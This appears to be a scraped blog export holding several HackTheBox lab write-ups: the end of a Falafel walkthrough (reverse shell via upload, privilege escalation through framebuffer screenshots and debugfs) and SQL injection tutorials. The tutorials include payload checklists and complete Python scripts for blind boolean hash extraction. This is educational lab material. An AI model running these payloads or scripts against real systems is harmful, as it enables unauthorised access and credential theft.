browse to this file.\nPHPInfo function loads perfectly. Now let\u0026rsquo;s copy a php reverse shell to PHPInfo test file we uploaded. I\u0026rsquo;ve added \u0026ldquo;GIF89a;\u0026rdquo; as the first line of this file for safety reasons, and modified it as necessary.\nOnce the file is uploaded, we\u0026rsquo;ll browse to it while our listener is on.\nWe have successfully gotten a shell as www-data user.\nPrivilege Escalation Escalating To Moshe First step is to always look for database credentials.\nWe got a password for a user \u0026ldquo;moshe\u0026rdquo;. Let\u0026rsquo;s see if our friend moshe re-used their password.\nAnd they did. We succesfully escalate our privileges from www-data to moshe. Let\u0026rsquo;s see if we can login via SSH.\nAnd we can. Logging in via SSH ensures that we get the most functional shell on the system, this is important in order to use various commands like sudo.\nEscalating To Yossi Let\u0026rsquo;s enumerate the machine as moshe. Checking home directory.\nWe found user.txt, and it\u0026rsquo;s readable, but that\u0026rsquo;s no fun. We\u0026rsquo;ll come back once we\u0026rsquo;re root. Continuing with enumeration using LinEnum.sh.\nHaving so many groups is quite odd. Let\u0026rsquo;s look at all the files we or our groups own, apart from some. The grep removal of some files is done after the default results are reviewed once and decided that some files are not worth looking into.\n## Before\rfor i in $(groups);do echo -e \u0026quot;\\n==========$i==========\u0026quot;; find / -group $i 2\u0026gt;/dev/null; done\r## After\rfor i in $(groups);do echo -e \u0026quot;\\n==========$i==========\u0026quot;; find / -group $i 2\u0026gt;/dev/null | grep -v \u0026quot;proc\\|lib\\|run\\|sys\u0026quot;; done\rWe have quite some logs on hand here.\nVideo files are something I have never worked with and certainly looks more odd than logs, and so I will look at these first and then logs.\nBy researching \u0026ldquo;/dev/fb0\u0026rdquo;, it turns out that it is a Frame Buffer Device. \u0026ldquo;The frame buffer device provides an abstraction for the graphics hardware.\u0026rdquo; More about frame buffer device can be learned from the Kernel Documentation.\nA thing that caught my eye out of curiousity was that you can take screenshots with this device itself, sounds pretty cool right? The contents of the screenshot are IN the device file, we can cat it to get its contents to some file.\nI searched how to use frame buffer and see if it is used and dmesg logs if you have accessed it.\nSaving the contents of the frame buffer to a file\nLooks like we have quite some data here (~ 4 Mb), could easily be a 720p image. Let\u0026rsquo;s transfer this image to our machine.\nTo work with this I installed gimp. Since we do not know which kind of file it\u0026rsquo;s and gimp did not automatically identify it as some extension.\nOnce opening the image there are not much parameters to mess with, the only parameter that changes the image a lot is \u0026ldquo;width\u0026rdquo;.\nAt 941 width the image makes a lot more sense than from where we started with. Looks like a screenshot of yossi user changing their password. Let\u0026rsquo;s keep going up.\nAt 1176 width the images is perfect. And we have the password of another user, time to escalate your privileges!\nWhile I was looking more into frame buffer screenshot, it turns out we could have saved some time by actually checking with what resolution a screenshot was taken with instead of all the guess work.\nLet\u0026rsquo;s change the user to yossi using su\nNow that we have escalated our privileges to yossi, let\u0026rsquo;s get to enumeration again. If you remember, like moshe, yossi themselves had quite a lot of groups, so let\u0026rsquo;s start there.\nEscalating To Root We will issue the same command as before to list all the files owned by groups yossi is a part of.\nfor i in $(groups);do echo -e \u0026quot;\\n==========$i==========\u0026quot;; find / -group $i 2\u0026gt;/dev/null; done\rOut of all, the disks group was the most interesting to me. We have access to /dev/sda1! It is the main partition of the Linux filesystem in which all the data is stored, we could get access to every single file that is present on the system, including shadow and roots\u0026rsquo; ssh key (if that exists)!\nWe not only have read access, but also write access. The way to access this file to get hold of a file is using debugfs, which lets you debug a file partition as long as you have read access to it.\nWe got the roots\u0026rsquo; SSH private key, let\u0026rsquo;s escalate our privileges. As a side note, ls actually works here, it just opens in a less-type way on the screen so it\u0026rsquo;s not visible once you close it.\nGetting Loot Now that we are root, let\u0026rsquo;s go get our loot.\nExtra - Vulnerability Analysis SQL Injection All of the authentication and authorization logic is in the file: login_logic.php, which the endpoint /login.php includes in it. Contents of the file are as follows:\n\u0026lt;?php include(\u0026quot;connection.php\u0026quot;); session_start(); if($_SERVER[\u0026quot;REQUEST_METHOD\u0026quot;] == \u0026quot;POST\u0026quot;) { if(!isset($_REQUEST['username'])\u0026amp;\u0026amp;!isset($_REQUEST['password'])){ //header(\u0026quot;refresh:1;url=login.php\u0026quot;);\r$message=\u0026quot;Invalid username/password.\u0026quot;; //die($message); goto end; } $username = $_REQUEST['username']; $password = $_REQUEST['password']; if(!(is_string($username)\u0026amp;\u0026amp;is_string($password))){ //header(\u0026quot;refresh:1;url=login.php\u0026quot;); $message=\u0026quot;Invalid username/password.\u0026quot;;\r//die($message); goto end; } $password = md5($password); $message = \u0026quot;\u0026quot;; if(preg_match('/(union|\\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){ $message=\u0026quot;Hacking Attempt Detected!\u0026quot;; //die($message); goto end; } $sql = \u0026quot;SELECT * FROM users WHERE username='$username'\u0026quot;; $result = mysqli_query($db,$sql); $users = mysqli_fetch_assoc($result); mysqli_close($db); if($users) {\rif($password == $users['password']){\rif($users['role']==\u0026quot;admin\u0026quot;){ $_SESSION['user'] = $username;\r$_SESSION['role'] = \u0026quot;admin\u0026quot;;\rheader(\u0026quot;refresh:1;url=upload.php\u0026quot;); //die(\u0026quot;Login Successful!\u0026quot;);\r$message = \u0026quot;Login Successful!\u0026quot;;\r}elseif($users['role']==\u0026quot;normal\u0026quot;){\r$_SESSION['user'] = $username; $_SESSION['role'] = \u0026quot;normal\u0026quot;; header(\u0026quot;refresh:1;url=profile.php\u0026quot;);\r//die(\u0026quot;Login Successful!\u0026quot;); $message = \u0026quot;Login Successful!\u0026quot;; }else{ $message = \u0026quot;That's weird..\u0026quot;; } } else{ $message = \u0026quot;Wrong identification : \u0026quot;.$users['username']; } } else{ $message = \u0026quot;Try again..\u0026quot;; } //echo $message; } end: ?\u0026gt;\rOn line 12, we can see that the username from our POST request is passed onto the PHP variable as-is. Down on line 30, we see that this variable is put in the SQL query which would be passed to the database and it would execute our malicious query and return the data or information back.\nOn line 24, we can see why our UNION attacks did not work regardless of what we tried. If \u0026ldquo;union\u0026rdquo; string existed in the username parameter it\u0026rsquo;d immediately send us a message \u0026ldquo;Hacking Attempt Detected\u0026rdquo; and throw our request out.\nOn line 53, we see that we only get the message \u0026ldquo;Wrong identification\u0026rdquo;, if we\u0026rsquo;re meeting just the username part of the authentication and not the password part.\nUpload Page /upload.php\n\u0026lt;?php include('authorized.php');?\u0026gt; \u0026lt;?php error_reporting(E_ALL); ini_set('display_errors', 1); function download($url) { $flags = FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED | FILTER_FLAG_PATH_REQUIRED; $urlok = filter_var($url, FILTER_VALIDATE_URL, $flags); if (!$urlok) { throw new Exception('Invalid URL'); } $parsed = parse_url($url); if (!preg_match('/^https?$/i', $parsed['scheme'])) { throw new Exception('Invalid URL: must start with HTTP or HTTPS'); } $host_ip = gethostbyname($parsed['host']); $flags = FILTER_FLAG_IPV4 | FILTER_FLAG_NO_RES_RANGE; $ipok = filter_var($host_ip, FILTER_VALIDATE_IP, $flags); if ($ipok === false) { throw new Exception('Invalid URL: bad host'); } $file = pathinfo($parsed['path']); $filename = $file['basename']; if(! array_key_exists( 'extension' , $file )){ throw new Exception('Bad extension'); } $extension = strtolower($file['extension']); $whitelist = ['png', 'gif', 'jpg']; if (!in_array($extension, $whitelist)) { throw new Exception('Bad extension'); } // re-assemble safe url $good_url = \u0026quot;{$parsed['scheme']}://{$parsed['host']}\u0026quot;; $good_url .= isset($parsed['port']) ? \u0026quot;:{$parsed['port']}\u0026quot; : ''; $good_url .= $parsed['path']; $uploads = getcwd() . '/uploads'; $timestamp = date('md-Hi'); $suffix = bin2hex(openssl_random_pseudo_bytes(8)); $userdir = \u0026quot;${uploads}/${timestamp}_${suffix}\u0026quot;; if (!is_dir($userdir)) { mkdir($userdir); } $cmd = \u0026quot;cd $userdir; timeout 3 wget \u0026quot; . escapeshellarg($good_url) . \u0026quot; 2\u0026gt;\u0026amp;1\u0026quot;; $output = shell_exec($cmd); return [ 'output' =\u0026gt; $output, 'cmd' =\u0026gt; \u0026quot;cd $userdir; wget \u0026quot; . escapeshellarg($good_url), 'file' =\u0026gt; \u0026quot;$userdir/$filename\u0026quot;, ];\r} $error = false; $result = false; $output = ''; $cmd = ''; if (isset($_REQUEST['url'])) { try { $download = download($_REQUEST['url']); $output = $download['output']; $filepath = $download['file']; $cmd = $download['cmd']; $result = true; } catch (Exception $ex) { $result = $ex-\u0026gt;getMessage(); $error = true; } } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Falafel Lovers - Image Upload\u0026lt;/title\u0026gt; \u0026lt;?php include('style.php');?\u0026gt; \u0026lt;?php include('css/style.php');?\u0026gt;\r\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php include('header.php');?\u0026gt;\r\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;div style='width: 60%;margin: 0 auto; color:#303030'\u0026gt; \u0026lt;div class=\u0026quot;container\u0026quot; style=\u0026quot;margin-top: 50px; margin-bottom: 50px;position: relative; z-index: 99; height: 110%;background:#F8F8F8;box-shadow: 10px 10px 5px #000000;padding-left: 50px;padding-right: 50px;\u0026quot;\u0026gt;\r\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;h1\u0026gt;Upload via url:\u0026lt;/h1\u0026gt; \u0026lt;?php if ($result !== false): ?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;?php if ($error): ?\u0026gt; \u0026lt;h3\u0026gt;Something bad happened:\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?php echo htmlentities($result); ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;?php else: ?\u0026gt; \u0026lt;h3\u0026gt;Upload Succsesful!\u0026lt;/h3\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h4\u0026gt;Output:\u0026lt;/h4\u0026gt; \u0026lt;pre\u0026gt;CMD: \u0026lt;?php echo htmlentities($cmd); ?\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;?php echo htmlentities($output); ?\u0026gt;\u0026lt;/pre\u0026gt;\r\u0026lt;/div\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;/div\u0026gt;\r\u0026lt;?php endif; ?\u0026gt; \u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Specify a URL of an image to upload:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input type=\u0026quot;url\u0026quot; name=\u0026quot;url\u0026quot; placeholder=\u0026quot;http://domain.com/path/image.png\u0026quot;\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Upload\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\r\u0026lt;footer\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\rIf you saw this entire code and were trying to figure out where the vulnerability lies, it\u0026rsquo;s in the way wget is used. This code apart from wget is pretty much secure from any kinda attacks as it\u0026rsquo;s sanitizing the user-input very well.\nOne way to make this code secure would\u0026rsquo;ve been renaming the file that is being sent to download to random 4 characters, something like follows:\n'cmd' =\u0026gt; \u0026quot;cd $userdir; wget \u0026quot; . escapeshellarg($good_url) . \u0026quot; -O \u0026quot; . bin2hex(openssl_random_pseudo_bytes(4) . \u0026quot;$extension\u0026quot;)\rYou could test this on your own machine too, serve the .PHP.PNG file and download it using wget\nBut if you make it save as some other name with the right extension, it would fix the vulnerability we faced.\nWith this, the code won\u0026rsquo;t be vulnerable anymore as wget is no longer performing any kind of shortening on its\u0026rsquo; own.\nAnother way to make this secure would\u0026rsquo;ve been to not use wget altogether, but rather using something else such as - file_put_contents() function of PHP.\nDownloading remote files on the server with user controlling which files to be downloaded and browsed to makes a very tricky situation for a developer, and one misconfiguration or a mistake could lead to a compromised web server.\nFin Both the scripts are available in this git repo. If some part of it feels unexplained or you did not understand, feel free to contact me :)\nTake care, have a great day, and keep hackin'!\n","permalink":"http://localhost:1313/hackthebox/htb-falafel-writeup-w-o-metasploit/","title":"HackTheBox - Falafel Writeup w/o Metasploit"},{"content":"SQL Injection 0x03 - Blind Boolean Attacks Introduction Blind SQL injection are the type of SQL injections attacks wherein no database error is received from the web responses, there are either subtle or no changes to the web page upon sending injection payloads. Since these changes are either subtle or non-existent, it becomes harder to identify and exploit these vulnerabilities but are certainly not impossible.\nHi, welcome to the third part of the SQL injection series, if you haven\u0026rsquo;t read the first two posts and are a complete beginner I\u0026rsquo;d suggest you read them first - SQL Injection 0x01 - Introduction and SQL Injection 0x02 - Testing \u0026amp; UNION Attacks. In this blog post I have covered blind boolean SQL injection attacks, as the title suggests, in which you receive subtle changes in the responses suggesting if the vulnerability is present, and if an injection payload is working or not.\nFor this post I decided to use Falafel machine from HackTheBox platform as the example to explain blind boolean SQL injection. If you would like to follow along and then finally hack the machine, I\u0026rsquo;ve posted the writeup here\nI will start from identification of interactable fields, test these fields, and then completely exploit it using different methods (BurpSuite Intruder and Custom Python Script)\nIdentification After going through application, /login.php was the only endpoint with which a user can interact, and with a database.\nSending admin : hasd\nLooks like \u0026ldquo;admin\u0026rdquo; user is present but it tells you if the password is wrong.\nLet\u0026rsquo;s send in a non-existent user to confirm our assumption. Sending noobsec : hasd\nWe can definitely do user enumeration.\nTesting We\u0026rsquo;ll start with testing now.\nSingle-quote Test Testing with a single-quote (') first. Sending admin' : hasd\nWe get an error - Try again... Looks like we broke the internal query.\nComment Test Next we will test with a comment (-- -). Sending admin--+- : hasd\nWe get an error - Try again... Looks like we broke the internal query.\nSingle-quote And Comment Test Let\u0026rsquo;s test a single-quote and a comment. We\u0026rsquo;ll append the username with a single-quote and then a comment, and see if that changes anything.\nSending admin'--+- : hasd\nWe get the wrong password error - Wrong identification : admin. With this we can say that we have an sql injection on our hand, but let\u0026rsquo;s finish our testing.\nOR Test We will now test with an operand - OR. Sending admin'+OR+'1'='1'--+- : hasd :\nWe get the wrong password error - Wrong identification : admin. With this we can again say that we have an sql injection on our hand, but let\u0026rsquo;s finish rest of our testing.\nLet\u0026rsquo;s test OR with a non-existent user. Sending noobsec'+OR+'1'='1'--+- : hasd :\nEven when we send in a wrong username, we get the wrong password error for admin due to our OR injection test, indicating that the injection is definitely working here.\nAND Test Now let\u0026rsquo;s test the field with AND operator. Sending admin'+AND+'1'='1'--+- : hasd\nWe get the wrong password error - Wrong identification : admin, great.\nLet\u0026rsquo;s test by sending a false condition. Sending admin'+AND+'1'='2'--+- : hasd\nWe get the error - Try again, even though the username was correct, once again confirming that we have sql injection on this field.\nSleep Test Let\u0026rsquo;s conclude our testing with the sleep() test. Sending admin'+OR+sleep(20)--+- : hasd\nNot only did this not work, it turns out that there is some filter in place in order to prevent malicious users to hack this authentication mechanism. Clearly, it\u0026rsquo;s been working out just fine :)\nExploitation Next step would be get the number of columns, but UNION is blocked regardless of what you do or try any kind of bypass. We could use ORDER BY to get the number of columns but clearly this is not an error-based SQL injection. Since we cannot use UNION, getting the number of columns does not make sense.\nAlthough we cannot dump credentials out on the screen, it does not mean we cannot extract data out.\nSince this is a SQL database, we could use substring - substring(string, position, length) function. As the name suggests, substring function takes a \u0026ldquo;string\u0026rdquo;, or a column (like in this case), along with position, and length, and prints out the characters of a string (or column) from the position and length you specify.\nLet\u0026rsquo;s test it with the username field to get a gist, since we know that the user \u0026ldquo;admin\u0026rdquo; exist\nIt\u0026rsquo;s important to keep in mind that when our SQL injection is working, we get the error \u0026ldquo;Wrong identification\u0026rdquo;, and when it does not, we get an error \u0026ldquo;Try again\u0026rdquo;.\nSimilarly, we can extract the hashes of the users present in this website.\nWe\u0026rsquo;ll test for [a-f0-9] (because hashes) for each character position for the password column, and if we get the error \u0026ldquo;Wrong identification\u0026rdquo;, then it would indicate that for position X the password column has that character.\nHash Extraction - BurpSuite Edition This can be done in BurpSuite Intruder, even in Community Edition which is what I use, let\u0026rsquo;s take a look at finding the first character of the admin\u0026rsquo;s hash.\nFirst we select a login request in BurpSuite and \u0026ldquo;Send it to intruder\u0026rdquo; and set our payload position:\nNext step to set a payload, we\u0026rsquo;ll select Brute Forcer. Modify the character set, as below:\nTo make our life easier, we could put the \u0026ldquo;right\u0026rdquo; error string in the \u0026ldquo;Grep Match\u0026rdquo; section so that the request that matches as per our error will get marked.\nWe\u0026rsquo;re now ready to \u0026ldquo;Start Attack\u0026quot;ing. Once we do, we soon find that the first character of the admins\u0026rsquo; hash is zero (0). We can now pause the attack since we already got what we needed from this injection.\nWe were successfully able to leverage BurpSuite Intruder to extract the first character of admins\u0026rsquo; hash and can see that it is \u0026ldquo;0\u0026rdquo; (Zero).\nHash Extraction - Python Edition Note: Link to the scripts are at the bottom\nAlthough that was nice and we could perform a little more tweaking and get the entire hash, it would be a whole LOT faster if we whipped up a script of our own and got this done, which is what we will be doing now.\nI wrote the script in python to get the admin\u0026rsquo;s hash.\n# Importing necessary library\rimport requests\r# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function\rdef SQLpayload(i,c):\rreturn \u0026quot;admin' AND substring(password,%s,1)='%s'-- -\u0026quot; % (i,c)\r# All the characters in a hash\rcharacters = 'abcdef0123456789'\r# \u0026quot;hash\u0026quot; comes as highlighted on python and I did not wanna mess with something I didn't know\r# so I'm using \u0026quot;password\u0026quot; to store the hash lol\rpassword = '' # Blank hash string\r# Loop through every index position : 1 to 32\rfor i in range(1,33):\r# Loop through every character in the \u0026quot;characters\u0026quot; for each index position\rfor c in characters:\r# Defining a payload to be sent to the server\rpayload = {'username':SQLpayload(i,c), 'password':'noobsec'}\r# Sending a post request with the above payload and it's data and response is saved in \u0026quot;r\u0026quot;\rr = requests.post('http://10.10.10.73/login.php',data=payload)\r# Checking if \u0026quot;right\u0026quot; error is hit at an index for a character\rif \u0026quot;Wrong identification\u0026quot; in r.text:\r# If right error is hit, append the character to the password string\rpassword += c\r# Print the character on the screen without moving the cursor to a new line\r# Helps in knowing the script is actually working and you're not sitting there for a few minutes just to realize it is broken\rprint(c,end='',flush=True)\r# No need to cycle through the rest of the characters if the \u0026quot;right\u0026quot; error is already hit for an index position\rbreak\r# Print the hash\rprint('\\nHash is:\\t'+password+'\\n')\rOnce we run the script we get the admin users\u0026rsquo; hash.\nAlthough this script works, it does take quite some time to run. So I created another script which would perform some extra queries to the database before it checks whether a particular range of characters are in users\u0026rsquo; hashs\u0026rsquo; X position or not.\nThe first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it\u0026rsquo;s a hash, it\u0026rsquo;ll always belong to a-f group which is \u0026ldquo;alpha1\u0026rdquo; in the below code. If it\u0026rsquo;s not an alphabet, it\u0026rsquo;s checked if the number belongs to [0-4] group or [5-9]. Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.\nThese checks are done using \u0026ldquo;ord\u0026rdquo;. Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it\u0026rsquo;s greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.\nNumbers (dec hex ascii) Alphabets (dec hex ascii) Check out man ascii to view the entire table.\nimport requests\rdef SQLstring(i,c):\r# We only want 1 password character at a time\r# Final payload will look like\r# username=admin'+AND+substring(password,1,1)='a'--+-\u0026amp;password=noobsec\rreturn \u0026quot;admin' AND substring(password,%s,1)='%s'-- -\u0026quot; % (i,c)\rdef SQLsplit(i):\r# Checking if the character is an alphabet\rsql = \u0026quot;admin' AND ord(substring(password,%s,1)) \u0026gt; '58'-- -\u0026quot; % i\rpayload = {'username':sql, 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\r# Checking if it's beyond \u0026quot;f\u0026quot;\rsql = \u0026quot;admin' AND ord(substring(password,%s,1)) \u0026gt; '102'-- -\u0026quot; % i\rpayload = {'username':sql, 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rreturn \u0026quot;alpha2\u0026quot;\relse:\r# If not beyond \u0026quot;f\u0026quot;\rreturn \u0026quot;alpha1\u0026quot;\r# Character is a number\relse:\r# Checking if number is less than \u0026quot;5\u0026quot;\rsql = \u0026quot;admin' AND ord(substring(password,%s,1)) \u0026lt; '53'-- -\u0026quot; % i\rpayload = {'username':sql, 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rreturn \u0026quot;num1\u0026quot;\relse:\r# If number is greater than 5\rreturn \u0026quot;num2\u0026quot;\r# password could be in hashed format or plaintext\ralpha1 = 'abcdef'\ralpha2 = 'ghijklmnopqrstuvwxyz'\rnum1 = '01234'\rnum2 = '56789'\r# Password variable\rpasswd = ''\rfor i in range(1,33):\rif SQLsplit(i) == \u0026quot;alpha1\u0026quot;:\rfor a in alpha1:\rpayload = {'username':SQLstring(i,a), 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += a\rprint(a,end='',flush=True)\rbreak\relif SQLsplit(i) == \u0026quot;alpha2\u0026quot;:\rfor a in alpha2:\rpayload = {'username':SQLstring(i,a), 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += a\rprint(a,end='',flush=True)\rbreak\relif SQLsplit(i) == \u0026quot;num1\u0026quot;:\rfor n in num1:\rpayload = {'username':SQLstring(i,n), 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += n\rprint(n,end='',flush=True)\rbreak\relse:\rfor n in num2:\rpayload = {'username':SQLstring(i,n), 'password':'noobsec'}\rr = requests.post('http://10.10.10.73/login.php',data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += n\rprint(n,end='',flush=True)\rbreak\r# print('\\n')\rprint('\\nPassword or Hash is:\\t'+passwd+'\\n')\rRunning this script to get the admins\u0026rsquo; hash:\nBy making a script with extra checks, it helped us save 38 seconds for just one account, if there were a lot of accounts in here that would add up to some considerable amount of time saved.\nThe above script is not perfect, maybe you could make it even more dynamic.\nSummary To summarize this post:\nIdentify all the fields that a user can interact with Take a look at all the input fields Consider all the parameters being passed to the backend Consider HTTP headers like User-Agent and Cookies, when application looks like it\u0026rsquo;s tracking a user Test each point individually with different characters and conditions Use functions like substring when UNION is not possible When dealing with repetitive tasks, or a lot of data/ queries, use automation Testing Checklist:\nName Character Function Single quote ' String terminator Semi colon ; Query terminator Comment -- - Removing rest of the query Single quote with a comment '-- - End a string and remove rest of the query Single quote, semi colon and a comment ';-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator ' OR '1'='1'-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator ' AND '1'='1'-- - For strings, true test Sleep function OR sleep(5)-- - Blind test Blind boolean hack steps:\nIdentify \u0026ldquo;right\u0026rdquo; and \u0026ldquo;wrong\u0026rdquo; errors. Test if substring is working with the username column Run a test round for the first position of the password column, which would be hash Write a script to perform the same Update the script to cycle through each character (a-f0-9) for 32 positions and print it out. Fin Both the scripts are available in this git repo. If some part of it feels unexplained or you did not understand, feel free to contact me :)\nTake care, have a great day, and keep hackin'!\n","permalink":"http://localhost:1313/sqli-0x03/","title":"SQL Injection 0x03 - Blind Boolean Attacks"},{"content":"SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven\u0026rsquo;t read the first part of the series, you can read it here.\nIn this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot.\nThe post contains two classic UNION injection examples from identification to exploitation of the same. Both the examples are separated into their own parts to ensure that a reader of any experience can follow along. At the end of the post I\u0026rsquo;ve put up a small table of new things I\u0026rsquo;ve introduced in this post and what they are. I\u0026rsquo;ve also put up a checklist of steps that you should perform when testing a parameter and when exploiting UNION-based SQL injections.\nVulnerability Identification To be able to identify all the potential SQL injection points, it\u0026rsquo;s essential that the application and its functionality is browsed through and understood (as much as possible), making note of all the pages and functions that might be interacting with the database, usually PHP, ASPX, or such pages. Some of the example of where an application might be interacting with the database would be:\nauthentication forms login password reset e-commerce platforms product display search engine portal Make note of all the user input fields and parameters being passed in requests. These would be the testing points for SQL injection.\nVulnerability Testing Once all the user input fields and parameters have been identified, each field and parameter needs to be tested individually. This is to ensure that only one object is affecting the backend and will make testing for effective. Along with these, HTTP headers like User-Agent and Cookie should also be on your list to test for. User-Agent and/or cookies might be getting tracked and written onto a table for analytics purposes or tracking users.\nBest way to test is to use something a SQL database would treat it as a part of the query itself.\n' # a single quote, treated as a string terminator\r; # a semi-colon, treated as a query terminator\r# # a comment, comments out anything that comes after that character in that line\r-- - # a comment, same as above\r/**/ # a comment, starts with /* , ends with */ , and can contain anything in between AND 1=1 # an and statement, 1=1 tests for true condition. Use 1=2 to test for false conditions\rOR 1=1 # an or statement, 1=1 tests for true condition, use 1=2 to test for false condition\rsleep(5)# delays the response by the number of seconds mentioned in the sleep command. The objective of these tests is for the existing query to return true, false or some kinda subtle changes to the webpage or bring out the errors.\nExample 1 - Blog All examples here are from HackTheBox - Charon machine.\nNormal looking blog post\nSingle-quote - ' Add a single quote at the end of the parameter or in an input field. Eg: http://example.com/blog.php?id=11' The post broke due to the semi colon, indicating that the parameter id could potentially be vulnerable to SQL injection\nSemi-colon - ; Add a semi-colon at the end of a parameter or in an input field Eg: http://example.com/blog.php?id=11; This indicates that even though the query may be getting terminated, the query is working just as intended.\nComments - -- - Comments passed onto the parameter or the input field needs to be database specific. MySQL uses the above mentioned comments. Eg: http://example.com/blog.php?id=11--%20- Even after commenting out the rest of the query, it is working as intended.\nAnd operator - AND AND operator should be passed with some additional condition in parameters or input fields. This means we can probably append any SQL statement to the id parameter. Since a post with id=11 exists and 1=1, it comes out to be true and the post loads. If the same is tried with some random id value, while 1=1, the post will not load.\nOR operator - OR OR operator should be passed with some additional condition in parameters or input fields. Unlike AND, whatever value you put in either the id field or the condition after OR, as long as one of them is true the requested blog post or the first post in the blog will load.\nSleep - sleep(seconds) When output doesn\u0026rsquo;t show that something is vulnerable to the SQL injection, doesn\u0026rsquo;t mean that it\u0026rsquo;s not. It could be blind. At times like those a sleep statement could be passed like id=11 AND sleep(20) and look at the amount of time it takes to send the response back, if it\u0026rsquo;s anywhere from 18-22 seconds, you have a SQL injection on your hand. Let\u0026rsquo;s see how long a normal request take\nLet\u0026rsquo;s see how long a request with a sleep command of 20 seconds take\nEven with the sleep command we could successfully test that this parameter is vulnerable. Sleep command requires to be used with an operator or a SELECT statement, it cannot be used as-is.\nVulnerability Exploitaion - UNION Attacks - Example 1 Once an SQL injection has been identified and tested, it is time to exploit it. An SQL injection exploitation is usually used in order to find something juicy - credentials, customer details, credit card numbers.\nThis post, as mentioned above, will cover UNION injections. Let\u0026rsquo;s continue with the above example.\nBackend Query We\u0026rsquo;ve successfully found that the id parameter is vulnerable to SQL injection. The way the code might be working at the backend would be that the PHP takes the id parameter from a GET request and then passes it to some internal variable, which puts it into a SQL query. If we had to guess the query it is executing it could be something like below:\nSELECT title, author, date, post FROM blogpost WHERE id=11\rWith this guess we can estimate that this particular table has 5 columns. Let\u0026rsquo;s test it out.\nNumber of Columns We\u0026rsquo;ll send a set of UNION requests to identify number of columns like follows:\nhttp://10.10.10.31/singlepost.php?id=11 UNION SELECT 1-- -\rWe can rule out that the table does not have just 1 column, and repeat the process by adding another number.\nAfter few iterations we found that the table indeed has 5 columns, our estimation was correct.\nThe above request would\u0026rsquo;ve generated a query as follows:\nSELECT title, author, date, post FROM blogpost WHERE id=11 UNION SELECT 1,2,3,4,5-- -\rThe reason the first UNION query (sent with only 1 column) did not work is because, a UNION of two tables has to have equal number of columns for it to be considered as a working query.\nWe can send in anything in the SELECT part of the UNION query since it is not taking anything from a table. We used numbers but you can also send in alphabets; if you do go for alphabets, do not forget to add quotes.\nWe do not know which column number (from our UNION) is going to which part of the blog post - title, author, date, post. To do that we can ask the webpage to load a non-existent post (a random id), which would result as false thus not loading anything, while our UNION is present. This will lead to our injected query getting printed out.\nNote: The number of columns printed out on the screen isn\u0026rsquo;t necessary to be matched by the UNION query, but the number of columns the table actually has. You can see here that only four things are getting printed on here, \u0026ldquo;1\u0026rdquo; isn\u0026rsquo;t getting printed out at all.\nWe can see that fifth column printed out first as title of the post, third and second column as author and date respectively in tiny font, and then the fourth column which has quite some space to put text in as it is used for the post of the blog.\nNow that we have column position on hand, we can start dumping data out on the screen.\nEnumerating Database Let\u0026rsquo;s look at the version of the MySQL database. We can use MySQL internal functions at our advantage here.\nLet\u0026rsquo;s check out the name of the database we\u0026rsquo;re using. In database systems, you can use multiple databases (within a single database management system like MySQL) under different user contexts.\nWe are using a database called \u0026ldquo;freeeze\u0026rdquo;\nLet\u0026rsquo;s take a look at the user we are running as.\nWe are running as \u0026ldquo;freeeze@localhost\u0026rdquo;. Not so useful, let\u0026rsquo;s move on.\nEnumerating Tables Now we want to know what tables exist in the database we are using.\nIn SQL we can list down tables and columns that exist in the database. In MySQL, there are a set of tables called as 